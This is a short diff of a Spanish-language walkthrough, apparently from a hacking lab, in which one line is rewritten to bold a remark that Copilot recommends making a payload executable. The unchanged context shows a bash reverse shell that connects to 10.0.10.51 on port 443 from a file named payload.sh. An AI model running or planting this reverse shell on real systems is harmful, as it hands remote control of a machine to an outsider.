@@ -96,7 +96,7 @@ Dentro del archivo `payload.sh` pegamos lo siguiente:
 bash -i >& /dev/tcp/10.0.10.51/443 0>&1
 ```
 
-Guardamos y cerramos el archivo. Ahora, damos permisos de ejecución (opcional pero recomendable, esto Mario no lo explica, pero Copilot dice que es recomendable):
+Guardamos y cerramos el archivo. Ahora, damos permisos de ejecución (opcional pero recomendable, **este apartado Mario no lo explica, pero Copilot dice que es recomendable**):
 
 ```bash (Kali Linux)
 chmod +x payload.sh
